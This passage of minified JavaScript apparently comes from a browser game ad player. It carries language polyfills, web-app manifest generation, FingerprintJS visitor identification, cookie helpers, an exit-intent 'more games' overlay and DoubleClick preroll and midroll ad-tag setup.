function w$a(f) {
    var k = 0;
    return function() {
        return k < f.length ? {
            done: !1,
            value: f[k++]
        } : {
            done: !0
        }
    }
}

function w$b(f) {
    var k = "undefined" != typeof Symbol && Symbol.iterator && f[Symbol.iterator];
    return k ? k.call(f) : {
        next: w$a(f)
    }
}

function w$(f) {
    if (!(f instanceof Array)) {
        f = w$b(f);
        for (var k, n = []; !(k = f.next()).done;) n.push(k.value);
        f = n
    }
    return f
}
var w$c = "function" == typeof Object.defineProperties ? Object.defineProperty : function(f, k, n) {
    if (f == Array.prototype || f == Object.prototype) return f;
    f[k] = n.value;
    return f
};

function w$d(f) {
    f = ["object" == typeof globalThis && globalThis, f, "object" == typeof window && window, "object" == typeof self && self, "object" == typeof global && global];
    for (var k = 0; k < f.length; ++k) {
        var n = f[k];
        if (n && n.Math == Math) return n
    }
    throw Error("Cannot find global object");
}
var w$e = w$d(this);

function w$f(f, k) {
    if (k) a: {
        var n = w$e;f = f.split(".");
        for (var t = 0; t < f.length - 1; t++) {
            var u = f[t];
            if (!(u in n)) break a;
            n = n[u]
        }
        f = f[f.length - 1];t = n[f];k = k(t);k != t && null != k && w$c(n, f, {
            configurable: !0,
            writable: !0,
            value: k
        })
    }
}
w$f("Symbol", function(f) {
    function k(u) {
        if (this instanceof k) throw new TypeError("Symbol is not a constructor");
        return new n("jscomp_symbol_" + (u || "") + "_" + t++, u)
    }

    function n(u, v) {
        this.ta = u;
        w$c(this, "description", {
            configurable: !0,
            writable: !0,
            value: v
        })
    }
    if (f) return f;
    n.prototype.toString = function() {
        return this.ta
    };
    var t = 0;
    return k
});
w$f("Symbol.iterator", function(f) {
    if (f) return f;
    f = Symbol("Symbol.iterator");
    for (var k = "Array Int8Array Uint8Array Uint8ClampedArray Int16Array Uint16Array Int32Array Uint32Array Float32Array Float64Array".split(" "), n = 0; n < k.length; n++) {
        var t = w$e[k[n]];
        "function" === typeof t && "function" != typeof t.prototype[f] && w$c(t.prototype, f, {
            configurable: !0,
            writable: !0,
            value: function() {
                return w$g(w$a(this))
            }
        })
    }
    return f
});

function w$g(f) {
    f = {
        next: f
    };
    f[Symbol.iterator] = function() {
        return this
    };
    return f
}

function w$h(f, k) {
    f instanceof String && (f += "");
    var n = 0,
        t = !1,
        u = {
            next: function() {
                if (!t && n < f.length) {
                    var v = n++;
                    return {
                        value: k(v, f[v]),
                        done: !1
                    }
                }
                t = !0;
                return {
                    done: !0,
                    value: void 0
                }
            }
        };
    u[Symbol.iterator] = function() {
        return u
    };
    return u
}
w$f("Array.prototype.keys", function(f) {
    return f ? f : function() {
        return w$h(this, function(k) {
            return k
        })
    }
});
w$f("Array.prototype.values", function(f) {
    return f ? f : function() {
        return w$h(this, function(k, n) {
            return n
        })
    }
});
w$f("Object.values", function(f) {
    return f ? f : function(k) {
        var n = [],
            t;
        for (t in k) Object.prototype.hasOwnProperty.call(k, t) && n.push(k[t]);
        return n
    }
});
w$f("Promise", function(f) {
    function k(h) {
        this.Vb = 0;
        this.Wb = void 0;
        this.ta = [];
        this.Dg = !1;
        var l = this.Bd();
        try {
            h(l.resolve, l.reject)
        } catch (q) {
            l.reject(q)
        }
    }

    function n() {
        this.ta = null
    }

    function t(h) {
        return h instanceof k ? h : new k(function(l) {
            l(h)
        })
    }
    if (f) return f;
    n.prototype.Vb = function(h) {
        if (null == this.ta) {
            this.ta = [];
            var l = this;
            this.Wb(function() {
                l.Cd()
            })
        }
        this.ta.push(h)
    };
    var u = w$e.setTimeout;
    n.prototype.Wb = function(h) {
        u(h, 0)
    };
    n.prototype.Cd = function() {
        for (; this.ta && this.ta.length;) {
            var h = this.ta;
            this.ta = [];
            for (var l = 0; l < h.length; ++l) {
                var q = h[l];
                h[l] = null;
                try {
                    q()
                } catch (a) {
                    this.Bd(a)
                }
            }
        }
        this.ta = null
    };
    n.prototype.Bd = function(h) {
        this.Wb(function() {
            throw h;
        })
    };
    k.prototype.Bd = function() {
        function h(a) {
            return function(b) {
                q || (q = !0, a.call(l, b))
            }
        }
        var l = this,
            q = !1;
        return {
            resolve: h(this.Zi),
            reject: h(this.Cd)
        }
    };
    k.prototype.Zi = function(h) {
        if (h === this) this.Cd(new TypeError("A Promise cannot resolve to itself"));
        else if (h instanceof k) this.fj(h);
        else {
            a: switch (typeof h) {
                case "object":
                    var l = null != h;
                    break a;
                case "function":
                    l = !0;
                    break a;
                default:
                    l = !1
            }
            l ? this.ui(h) : this.Cg(h)
        }
    };
    k.prototype.ui = function(h) {
        var l = void 0;
        try {
            l = h.then
        } catch (q) {
            this.Cd(q);
            return
        }
        "function" == typeof l ? this.jj(l, h) : this.Cg(h)
    };
    k.prototype.Cd = function(h) {
        this.Eg(2, h)
    };
    k.prototype.Cg = function(h) {
        this.Eg(1, h)
    };
    k.prototype.Eg = function(h, l) {
        if (0 != this.Vb) throw Error("Cannot settle(" + h + ", " + l + "): Promise already settled in state" + this.Vb);
        this.Vb = h;
        this.Wb = l;
        2 === this.Vb && this.cj();
        this.si()
    };
    k.prototype.cj = function() {
        var h = this;
        u(function() {
            if (h.ti()) {
                var l = w$e.console;
                "undefined" !== typeof l && l.error(h.Wb)
            }
        }, 1)
    };
    k.prototype.ti = function() {
        if (this.Dg) return !1;
        var h = w$e.CustomEvent,
            l = w$e.Event,
            q = w$e.dispatchEvent;
        if ("undefined" === typeof q) return !0;
        "function" === typeof h ? h = new h("unhandledrejection", {
            cancelable: !0
        }) : "function" === typeof l ? h = new l("unhandledrejection", {
            cancelable: !0
        }) : (h = w$e.document.createEvent("CustomEvent"), h.initCustomEvent("unhandledrejection", !1, !0, h));
        h.promise = this;
        h.reason = this.Wb;
        return q(h)
    };
    k.prototype.si = function() {
        if (null != this.ta) {
            for (var h = 0; h < this.ta.length; ++h) v.Vb(this.ta[h]);
            this.ta = null
        }
    };
    var v = new n;
    k.prototype.fj = function(h) {
        var l = this.Bd();
        h.le(l.resolve, l.reject)
    };
    k.prototype.jj = function(h, l) {
        var q = this.Bd();
        try {
            h.call(l, q.resolve, q.reject)
        } catch (a) {
            q.reject(a)
        }
    };
    k.prototype.then = function(h, l) {
        function q(d, e) {
            return "function" == typeof d ? function(g) {
                try {
                    a(d(g))
                } catch (p) {
                    b(p)
                }
            } : e
        }
        var a, b, c = new k(function(d, e) {
            a = d;
            b = e
        });
        this.le(q(h, a), q(l, b));
        return c
    };
    k.prototype.catch = function(h) {
        return this.then(void 0, h)
    };
    k.prototype.le = function(h, l) {
        function q() {
            switch (a.Vb) {
                case 1:
                    h(a.Wb);
                    break;
                case 2:
                    l(a.Wb);
                    break;
                default:
                    throw Error("Unexpected state: " + a.Vb);
            }
        }
        var a = this;
        null == this.ta ? v.Vb(q) : this.ta.push(q);
        this.Dg = !0
    };
    k.resolve = t;
    k.reject = function(h) {
        return new k(function(l, q) {
            q(h)
        })
    };
    k.race = function(h) {
        return new k(function(l, q) {
            for (var a = w$b(h), b = a.next(); !b.done; b = a.next()) t(b.value).le(l, q)
        })
    };
    k.all = function(h) {
        var l = w$b(h),
            q = l.next();
        return q.done ? t([]) : new k(function(a, b) {
            function c(g) {
                return function(p) {
                    d[g] = p;
                    e--;
                    0 == e && a(d)
                }
            }
            var d = [],
                e = 0;
            do d.push(void 0), e++, t(q.value).le(c(d.length - 1), b), q = l.next(); while (!q.done)
        })
    };
    return k
});
w$f("String.prototype.repeat", function(f) {
    return f ? f : function(k) {
        if (null == this) throw new TypeError("The 'this' value for String.prototype.repeat must not be null or undefined");
        var n = this;
        if (0 > k || 1342177279 < k) throw new RangeError("Invalid count value");
        k |= 0;
        for (var t = ""; k;)
            if (k & 1 && (t += n), k >>>= 1) n += n;
        return t
    }
});
w$f("Array.prototype.entries", function(f) {
    return f ? f : function() {
        return w$h(this, function(k, n) {
            return [k, n]
        })
    }
});
var w$i = document.createElement("link");
w$i.setAttribute("rel", "manifest");
w$i.setAttribute("id", "wgpmanifest");
document.head.appendChild(w$i);
var w$j;
"function" !== typeof w$j && (w$j = function() {
    if (window.preroll && window.preroll.config && window.preroll.config.app) {
        window.preroll.config.app.safeImg && (document.createElement("img").src = window.preroll.config.app.safeImg);
        var f = JSON.stringify({
            short_name: window.preroll.config.app.name ? window.preroll.config.app.name : window.preroll.config.gameName,
            name: window.preroll.config.app.shortName ? window.preroll.config.app.shortName : window.preroll.config.gameName,
            icons: [{
                src: window.preroll.config.app.smallIcon ? window.preroll.config.app.smallIcon : "https://scylla.mobee.xyz/f_jpg/w_192/h_192/" + window.preroll.config.gameThumbnail,
                type: "image/png",
                sizes: "192x192",
                purpose: "any"
            }, {
                src: window.preroll.config.app.smallIcon ? window.preroll.config.app.smallIcon : "https://scylla.mobee.xyz/f_jpg/w_192/h_192/" + window.preroll.config.gameThumbnail,
                type: "image/png",
                sizes: "192x192",
                purpose: "maskable"
            }, {
                src: window.preroll.config.app.bigIcon ? window.preroll.config.app.bigIcon : "https://scylla.mobee.xyz/f_jpg/w_512/h_512/" + window.preroll.config.gameThumbnail,
                type: "image/png",
                sizes: "512x512",
                purpose: "maskable"
            }],
            start_url: window.location.href + (-1 < window.location.href.indexOf("?") ? "&" : "?") + "utm_source=hs",
            background_color: window.preroll.config.app.bgColor ? window.preroll.config.app.bgColor : "#569aff",
            display: window.preroll.config.app.display ? window.preroll.config.app.display : "standalone",
            scope: window.location.href.substring(0, window.location.href.lastIndexOf("/") + 1),
            theme_color: window.preroll.config.app.themeColor ? window.preroll.config.app.themeColor : "#569aff"
        });
        f = URL.createObjectURL(new Blob([f], {
            type: "application/json"
        }));
        w$i.setAttribute("href", f)
    }
});
w$j();

function w$k(f, k, n) {
    function t() {
        return window.preroll.config
    }
    n = void 0 === n ? !1 : n;
    var u = f.zIndex ? f.zIndex : 9999,
        v = 9999 < u ? u + 1 : 9999,
        h = {
            v: {
                m: 100,
                i: 5
            },
            vs: {
                m: 100,
                i: 5
            },
            i: {
                m: 100,
                i: 5
            },
            t: {
                m: 100,
                i: 5
            }
        };
    k = {};
    var l = {},
        q = {},
        a = {
            getVersion: function() {
                return "U7.1.0.13.3"
            },
            npa: !1,
            options: null,
            useFlashAllowPopup: !1 === f.useFlashAllowPopup ? !1 : !0,
            get qg() {
                try {
                    return window.sessionStorage.setItem("WGP", !0), !0
                } catch (b) {
                    return !1
                }
            },
            spqr: ["ADX-AFG-SQPR"],
            Na: null,
            na: "ontouchend" in window ? "touchend" : "click",
            ef: !1,
            ria: !0,
            lt: 1,
            Xa: {
                info: "&pmnd=0&pmxd=90000&pmad=2",
                span: 10,
                Lc: null
            },
            vpaidMode: null,
            Pa: !1,
            Yj: !1,
            Sg: 0,
            Gb: !1,
            ea: {
                adBlock: !1,
                time: {
                    init: Date.now(),
                    interact: null,
                    abort: null
                },
                id: null,
                domain: document.domain,
                w: screen.width || 0,
                h: screen.height || 0,
                url: encodeURIComponent(location.href),
                currentAd: [],
                AdContainerInit: {},
                AdContainerOnResize: {},
                game: {
                    name: null,
                    thumbnail: null
                },
                ml: 0
            },
            Th: null,
            wd: function() {
                return a.isMobile()
            },
            Il: function() {
                var b = document.createElement("script");
                document.head.appendChild(b);
                b.addEventListener("load", function() {
                    window.FingerprintJS.load().then(function(c) {
                        return c.get({
                            debug: !1
                        })
                    }).then(function(c) {
                        a.Th = c.visitorId;
                        a.j("PIC: " + c.visitorId)
                    })
                });
                b.setAttribute("src", "https://st.wgplayer.com/fps.js")
            },
            tc: function(b, c, d) {
                c = c.split(" ");
                for (var e = 0, g = c.length; e < g; e++) b.addEventListener(c[e], d, !1)
            },
            Kd: null,
            La: !1,
            kg: !1,
            get ka() {
                return {
                    w: document.documentElement.clientWidth,
                    h: document.documentElement.clientHeight
                }
            },
            O: !1,
            $a: null,
            kd: !1,
            Sk: null,
            B: {
                init: function() {},
                setVolume: function() {},
                getVolume: function() {},
                getDuration: function() {},
                skip: function() {},
                destroy: function() {},
                getRemainingTime: function() {},
                resize: function() {},
                start: function() {}
            },
            ra: null,
            ia: null,
            Ja: null,
            za: null,
            S: null,
            xa: null,
            contentContainer: null,
            di: !0,
            pf: !1,
            Xk: !1,
            Yk: 0,
            Zb: {
                w: 0,
                h: 0
            },
            adCount: {
                preroll: {
                    limit: "undefined" !== typeof f.preAdLimit ? parseInt(f.preAdLimit, 10) : -1,
                    count: 0
                },
                midroll: {
                    limit: "undefined" !== typeof f.midAdLimit ? parseInt(f.midAdLimit, 10) : -1,
                    count: 0
                }
            },
            ae: 0,
            $b: {
                preroll: {
                    opd: 0,
                    st: 0
                },
                midroll: {
                    opd: 0,
                    st: 0
                }
            },
            gd: "Loading;;Loading;;Getting ready;;Almost done".split(";"),
            unique: function(b, c, d) {
                return d.indexOf(b) === c
            },
            $d: {
                mm: Date.now(),
                ik: 0,
                paused: !1,
                init: function() {
                    setInterval(function() {
                        a.$d.paused || a.$d.ik++
                    }, 1E3)
                },
                pause: function() {
                    a.$d.paused = !0
                },
                resume: function() {
                    a.$d.paused = !1
                }
            },
            vd: function(b, c, d) {
                if (d) {
                    var e = new Date;
                    e.setTime(e.getTime() + 36E5 * d);
                    e = "; expires=" + e.toUTCString()
                }
                document.cookie = b + "=" + (c || "") + (d ? e : "") + "; path=/"
            },
            gc: function(b) {
                return a.Aa(b)
            },
            Aa: function(b) {
                b += "=";
                for (var c = document.cookie.split(";"), d = 0; d < c.length; d++) {
                    for (var e = c[d];
                        " " == e.charAt(0);) e = e.substring(1, e.length);
                    if (0 == e.indexOf(b)) return e.substring(b.length, e.length)
                }
                return null
            },
            ci: function(b, c) {
                try {
                    return window.localStorage.setItem(b, c), !0
                } catch (d) {
                    return !1
                }
            },
            oj: function(b) {
                try {
                    return window.localStorage.getItem(b)
                } catch (c) {
                    return !1
                }
            },
            eh: function(b) {
                return b.replace(/&#(\d+);/g, function(c, d) {
                    return String.fromCharCode(d)
                })
            },
            tl: function(b) {
                document.cookie = b + "=; Max-Age=-99999999;"
            },
            Ui: function() {
                var b = navigator.cookieEnabled;
                b || (document.cookie = "_wgtc_", b = -1 != document.cookie.indexOf("_wgtc_"));
                return b
            },
            Nh: function(b, c, d) {
                d = void 0 === d ? null : d;
                var e = new XMLHttpRequest;
                e.overrideMimeType("application/json");
                e.open("GET", b, !0);
                e.onreadystatechange = function() {
                    4 === e.readyState && "200" == e.status && (d ? c.call(this, e.responseText) : c(e.responseText))
                };
                e.send(null)
            },
            hash: function(b) {
                var c = 0;
                if (0 == b.length) return c;
                b = b.replace("#goog_rewarded", "");
                for (var d = 0; d < b.length; d++) c = (c << 5) - c + b.charCodeAt(d), c &= c;
                return c
            },
            Ag: {
                startTime: new Date,
                enabled: !0,
                Vl: null,
                feedURL: f.moreGames && f.moreGames.feed ? f.moreGames.feed : f.otherGames && f.otherGames.file ? f.otherGames.file : null,
                pk: f.moreGames && f.moreGames.time ? f.moreGames.time : 1,
                Ul: !1,
                get Vg() {
                    return null === a.Aa("moreGamesWasDisplayed")
                },
                container: null,
                Ua: null,
                Ge: null,
                He: null,
                Ob: null,
                fg: null,
                Zd: -1,
                get Yc() {
                    return Math.round(new Date - a.Ag.startTime)
                },
                wh: function(b) {
                    var c = this,
                        d = b.clientY;
                    5 > b.clientX || 5 > d ? this.Yc >= this.pk && !0 === this.Vg && -1 === this.Zd && (a.j("WGP: Set timer for WBYG"), this.Zd = setTimeout(function() {
                        c.show()
                    }, 350)) : -1 < this.Zd && (clearTimeout(this.Zd), this.Zd = -1, a.j("WGP: Clear timer for WBYG"))
                },
                init: function() {
                    if (!this.feedURL) return !1;
                    var b = document.querySelectorAll("[wgmoregames]");
                    if (0 < b.length) {
                        b = w$b(b);
                        for (var c = b.next(); !c.done; c = b.next()) c = c.value, c.parentNode.removeChild(c)
                    }
                    c = document.getElementsByTagName("body")[0];
                    this.container = a.F("div", "moreGames");
                    this.container.setAttribute("wgMoreGames", "");
                    b = "." + this.container.classList[0] + "{position:fixed; z-index:" + parseInt(v + 1, 10) + "; width:100%; height:100%; top:0; left:0; background:none; display:none;}";
                    b += "." + this.container.classList[0] + " *{font-family:'Roboto',sans-serif !important;}";
                    a.s(b);
                    this.Ge = a.F("div", "moreGamesItemsContainer");
                    b = "." + this.Ge.classList[0] + "{display:table; width:100%; height:100%; background:none; }";
                    a.s(b);
                    this.container.appendChild(this.Ge);
                    this.He = a.F("div", "moreGamesItemsContainerContent");
                    b = "." + this.He.classList[0] + "{display:table-cell; width:100%; height:100%; vertical-align:middle; text-align:center;background: rgba(52, 58, 65, 0.7); backdrop-filter: blur(15px); }";
                    a.s(b);
                    this.Ge.appendChild(this.He);
                    this.Ie = a.F("div", "itemsContainerContentHolderMaskParent");
                    b = "." + this.Ie.classList[0] + "{display:inline-block; position:relative; box-shadow: 0px 0px 0px 0px #ffffff, 5px 5px 15px rgba(0,0,0,0.2); border-radius:10px; background:#dcdcdc; border-radius:50px; background-color: #0093E9; background-image: linear-gradient(160deg, #2f6cab 0%, #83b4f1 100%);}";
                    a.s(b);
                    this.He.appendChild(this.Ie);
                    this.jd = a.F("div", "itemsContainerContentHolderMask");
                    b = "." + this.jd.classList[0] + "{display:table; position:relative; text-align:center; margin:0 auto; padding:50px;}";
                    b += "." +
                        this.jd.classList[0] + "{border-top-width: 7px; border-right-width: 7px; border-bottom-width: 7px; border-left-width: 7px; border-color: #ffffff; border-style: solid; border-top-left-radius: 35px; border-top-right-radius: 35px; border-bottom-right-radius: 35px; border-bottom-left-radius: 35px; box-shadow: 0px 0px 0px 0px #fff0; box-shadow: 10px 10px 10px 0px rgb(0 0 0 / 31%);}";
                    a.s(b);
                    this.Ie.appendChild(this.jd);
                    "undefined" !== typeof a.options.gameLogo && (this.fg = a.F("div", "moreGamesLogo"), b = "." + this.fg.classList[0] +
                        "{display:block; margin:0 auto; height:30px; margin:0 30px 30px 30px; background:url(" + a.options.gameLogo + ") no-repeat center center; background-size: contain;}", a.s(b), this.jd.appendChild(this.fg));
                    this.Pd = a.F("div", "moreGamesItemsContainerContentTitle");
                    b = "." + this.Pd.classList[0] + "{display:block; width:100%; position:relative; padding:0px 30px 30px 0; box-sizing:border-box;}";
                    b += "." + this.Pd.classList[0] + " *{color:#fff;}";
                    a.s(b);
                    this.jd.appendChild(this.Pd);
                    this.dg = a.F("h3", "moreGamesItemsContainerContentTitleText");
                    b = "." + this.dg.classList[0] + "{display:block; padding:0 0 20px 0; font-size:40px; font-weight:600; margin:0; text-align:center;}";
                    a.s(b);
                    this.Pd.appendChild(this.dg);
                    this.dg.innerHTML = a.options.moreGames && a.options.moreGames.text && a.options.moreGames.text[0] ? a.options.moreGames.text[0] : "Wait, don't miss these games!";
                    this.cg = a.F("div", "moreGamesItemsContainerContentText");
                    b = "." + this.cg.classList[0] + "{display:block; font-size:22px; font-weight:400; margin:0; text-align:center;}";
                    a.s(b);
                    this.Pd.appendChild(this.cg);
                    this.cg.innerHTML = a.options.moreGames && a.options.moreGames.text && a.options.moreGames.text[1] ? a.options.moreGames.text[1] : "Here is a selection of games you might like";
                    this.Ob = a.F("ul", "moreGamesItemsContainerContentHolder");
                    b = "." + this.Ob.classList[0] + "{display: grid;grid-template-columns: 1fr 1fr;grid-gap: 20px; margin:0; padding:0;}";
                    b += "." + this.Ob.classList[0] + " li{ transition:.2s; width:100%; overflow:hidden; box-shadow: 0px 0px 0px 0px #ffffff, 5px 5px 15px rgba(0,0,0,0.2); position:relative; list-style-type:none; border-radius:15px; background:#fff; }";
                    b += "." + this.Ob.classList[0] + " li:hover{ transform:scale(1.05);}";
                    b += "." + this.Ob.classList[0] + " li a{ position:absolute; width:100%; height:100%; top:0; left:0; }";
                    b += "." + this.Ob.classList[0] + " li div{ display:grid; grid-template-columns: 30% auto; height:100%; min-height:100px; }";
                    b += "." + this.Ob.classList[0] + " li div .wgmgTitle{ display: flex; align-self: center; text-align: left; padding: 10px; }";
                    a.s(b);
                    this.jd.appendChild(this.Ob);
                    this.Ua = a.F("a", "moreGamesCloseButton");
                    b = "." + this.Ua.classList[0] +
                        "{position: absolute; box-sizing: content-box; top: -10px;right: -10px;width: 20px;height: 20px;cursor: pointer;z-index: 1000; padding: 15px;border-radius: 50%; background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDYuMC1jMDAyIDc5LjE2NDQ2MCwgMjAyMC8wNS8xMi0xNjowNDoxNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjIgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjA1MEIxNzI2NUZENDExRUJBMDhDRkM1N0Q2M0FGNjRDIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjA1MEIxNzI3NUZENDExRUJBMDhDRkM1N0Q2M0FGNjRDIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6MDUwQjE3MjQ1RkQ0MTFFQkEwOENGQzU3RDYzQUY2NEMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MDUwQjE3MjU1RkQ0MTFFQkEwOENGQzU3RDYzQUY2NEMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz55iLsfAAABiElEQVR42uzZXUrDQBAH8DRKnryAHsBL5BQKtdavuym20eahXiKH8ALtBXwKLHEGZiGEpjsxsxkps/B/KNmW+XXZr3bWNE1yCi1NTqQZxCAGMYhBDGIQg/zDdv6XN+V5HrWoqqrURmQO+YRkzP4Z9Z+rjsgBxJo+C7OE1AFEAbmlYCu150gbkVBhxZGRaSP8F7mWGJl0JKI4MKp9mC4ikcSMgSwgZz3Pupg+RBujBnmAfB157jEXAQS2LeRJC1LTqIQw3wzEfWCBiD7ZOZir2AipfYSDiYqQ3BCHYkQR0mctLOoZsg/020FeJBHSEFxi3yCXgX44Z14HHGcmhWBRH5AbZv/QCUAFMhQRBZNOgNhPgUkjI3B1umaeADItyIqBwCX2h5bmbQDzrgXBO4Rj7hM1ve7DuLF3kjGQDR0cHXOz68M4uoyVmpN9Q0U45o7dxYggpK66vog7yCNjx/aYFX0RpUANIhCPGVJQLfnDg/QRRbXN7M9QgxjEIAYxiEEMYhCDhNqvAAMAWkFlCtfQnuoAAAAASUVORK5CYII=) no-repeat center center #fff; background-size:70%;}";
                    a.s(b);
                    this.Ie.appendChild(this.Ua);
                    this.Ua.addEventListener(a.na, function(d) {
                        d.preventDefault();
                        this.aa()
                    }.bind(this));
                    a.Nh(this.feedURL, this.Pj);
                    c.appendChild(this.container);
                    window.addEventListener("mousemove", this.wh.bind(this), !1);
                    document.addEventListener("mouseout", this.wh.bind(this), !1)
                },
                Pj: function(b) {
                    var c = 0;
                    b = JSON.parse(b);
                    for (var d in b) b.hasOwnProperty(d) && (a.Ag.ff({
                        index: c,
                        image: b[d].thumbnail,
                        url: b[d].url + (!1 !== a.options.utmsource ? (-1 < b[d].url.indexOf("?") ? "&" : "?") + "utm_source=byg" : ""),
                        title: b[d].name
                    }), c++)
                },
                Fl: function() {},
                ff: function(b) {
                    var c = a.F("li", "itemsContainerContentItem");
                    this.Ob.appendChild(c);
                    var d = a.F("a", "itemAnchor");
                    d.setAttribute("target", "_blank");
                    d.setAttribute("data-google-interstitial", !1);
                    d.href = b.url;
                    c.appendChild(d);
                    d = a.F("div", "mgItemGroup");
                    var e = a.F("span", "mgImage" + b.index);
                    a.s("." + e.classList[0] + "{width:100%; height:100%; background-image:url(" + b.image + "); background-size:cover; background-repeat:no-repeat; background-align:center center; color:#fff; text-align:left; display:block;}");
                    d.appendChild(e);
                    e = a.F("span", "mgTitle");
                    e.innerHTML = b.title;
                    d.appendChild(e);
                    c.appendChild(d)
                },
                show: function() {
                    this.container.classList.add("wgVisible");
                    a.vd("moreGamesWasDisplayed", !0, a.options.moreGames.ttl ? 1 * a.options.moreGames.ttl / 60 / 60 / 1E3 : null)
                },
                aa: function() {
                    this.container.classList.remove("wgVisible")
                }
            },
            get Pk() {
                var b = "innerWidth" in window ? window.innerWidth : document.documentElement.innerWidth;
                return {
                    w: a.options.ms ? a.options.ms : b,
                    h: "innerHeight" in window ? window.innerHeight : document.documentElement.innerHeight
                }
            },
            zb: null,
            Za: !1,
            bi: function(b, c) {
                a.Zb.w = b;
                a.Zb.h = c;
                a.j(0, b, c)
            },
            ic: function() {
                return {
                    w: a.u().getBoundingClientRect().width,
                    h: a.u().getBoundingClientRect().height
                }
            },
            Md: !0,
            Bb: !0,
            R: (q.f = (k.preroll = !1, k.midroll = !1, k), q.size = (l.preroll = 0, l.midroll = 0, l), q.preroll = [], q.midroll = [], q),
            sd: function() {
                a.j(1, a.R.preroll.length);
                a.Uh();
                a.xb = 1;
                a.Sc = 0;
                a.R.preroll = [];
                a.R.midroll = [];
                f && f.adTagURL && ("object" === typeof f.adTagURL ? f.adTagURL.forEach(function(c) {
                    a.Ma({
                        code: a.ga(c, null, "preroll")
                    }, "preroll")
                }) : a.Ma({
                    code: a.ga(f.adTagURL, null, "preroll")
                }, "preroll"));
                f && f.midrollAdTagURL && ("object" === typeof f.midrollAdTagURL ? f.midrollAdTagURL.forEach(function(c) {
                    a.Ma({
                        code: a.ga(c, null, "midroll")
                    }, "midroll")
                }) : a.Ma({
                    code: a.ga(f.midrollAdTagURL, null, "midroll")
                }, "midroll"));
                f && f.adTagURL && !f.midrollAdTagURL && ("object" === typeof f.adTagURL ? f.adTagURL.forEach(function(c) {
                    a.Ma({
                        code: a.ga(c, null, "midroll")
                    }, "midroll")
                }) : a.Ma({
                    code: a.ga(f.adTagURL, null, "midroll")
                }, "midroll"));
                a.R.size.preroll = Object.keys(a.R.preroll).length;
                a.R.size.midroll = Object.keys(a.R.midroll).length;
                a.R.f.preroll = !1;
                a.R.f.midroll = !1;
                "undefined" !== typeof a.options.ms && (1 === a.R.size.preroll && ("object" === typeof f.adTagURL ? a.Ma({
                    code: a.ga(f.adTagURL[0], null, "preroll")
                }, "preroll") : a.Ma({
                    code: a.ga(f.adTagURL, null, "preroll")
                }, "preroll"), a.R.size.preroll = Object.keys(a.R.preroll).length), 1 === a.R.size.midroll && ("object" === typeof f.midrollAdTagURL ? a.Ma({
                    code: a.ga(f.midrollAdTagURL[0], null, "midroll")
                }, "midroll") : a.Ma({
                    code: a.ga(f.midrollAdTagURL, null, "midroll")
                }, "midroll"), a.R.size.midroll = Object.keys(a.R.midroll).length));
                if ("undefined" === typeof a.options.dsc) {
                    var b = "undefined" !== typeof a.options.ri ? a.options.ri : "//pubads.g.doubleclick.net/gampad/ads?sz=730x400&iu=/1002212/ADX-AFG-DSC&impl=s&gdfp_req=1&env=vp&output=vast&unviewed_position_start=1&hl=" + (navigator.language || navigator.ta) + "&url=" + encodeURIComponent(window.location.href) + "&description_url=" + encodeURIComponent(window.location.href) + "&corelator=" + Math.floor(1E7 * Math.random());
                    a.Ma({
                        code: a.ga(b, "AFGURL=" +
                            a.wc, "preroll")
                    }, "preroll", "ADX-AFG-Preroll");
                    a.R.size.preroll = Object.keys(a.R.preroll).length;
                    a.Ma({
                        code: a.ga(b, "AFGURL=" + a.wc, "midroll")
                    }, "midroll", "ADX-AFG-Midroll");
                    a.R.size.midroll = Object.keys(a.R.midroll).length
                }
                "undefined" === typeof a.options.dsc && (b = "undefined" !== typeof a.options.fallbackAdTagURL ? a.options.fallbackAdTagURL : "//pubads.g.doubleclick.net/gampad/ads?sz=730x400&iu=/1002212/ADX-AFG-Embed-House&impl=s&gdfp_req=1&env=vp&output=vast&unviewed_position_start=1&hl=" + (navigator.language || navigator.ta) + "&url=" + encodeURIComponent(window.location.href) + "&description_url=" + encodeURIComponent(window.location.href) + "&corelator=" + Math.floor(1E7 * Math.random()), !1 === a.Md && (a.Ma({
                    code: a.ga(b, "AFGURL=" + a.wc, "preroll")
                }, "preroll"), a.R.size.preroll = Object.keys(a.R.preroll).length), a.Ma({
                    code: a.ga(b, "AFGURL=" + a.wc, "midroll")
                }, "midroll"), a.R.size.midroll = Object.keys(a.R.midroll).length)
            },
            Ma: function(b, c, d) {
                if (c in a.R && "object" === typeof a.R) {
                    var e = !1;
                    b = {
                        code: b.code,
                        vm: 0
                    };
                    if ("undefined" !== typeof d) {
                        for (var g = [], p = 0; p < a.R[c].length; p++) g.push(a.R[c][p]), -1 < a.R[c][p].code.indexOf(d) && (g.push(b), e = !0);
                        e && (a.R[c] = g)
                    } else a.R[c].push(b)
                }
            },
            re: function(b, c) {
                c = void 0 === c ? !0 : c;
                if (Object.keys(a.R[b])[0]) {
                    var d;
